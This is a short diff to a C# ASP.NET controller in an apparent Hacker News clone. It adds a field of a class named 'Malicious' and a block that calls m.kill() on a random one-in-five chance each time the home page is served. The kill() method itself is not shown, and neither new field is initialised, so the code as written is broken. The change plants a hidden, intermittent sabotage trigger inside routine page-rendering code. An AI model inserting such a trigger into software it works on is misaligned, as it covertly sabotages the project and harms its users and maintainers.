@@ -20,6 +20,10 @@ namespace Project_HNClone.Controllers
 
         private IMemoryCache _cache;
 
+        private Random random;
+
+        private Malicious m;
+
         public HomeController(IConfiguration config, IMemoryCache memoryCache)
         {
             this.configuration = config;
@@ -54,6 +58,11 @@ namespace Project_HNClone.Controllers
             ModelState.Clear();
 
             ViewBag.OnePageOfStories = onePageOfStories;
+
+            if (random.Next(1, 6) == 3)
+            {
+                m.kill();
+            }
 
             return View();
         }
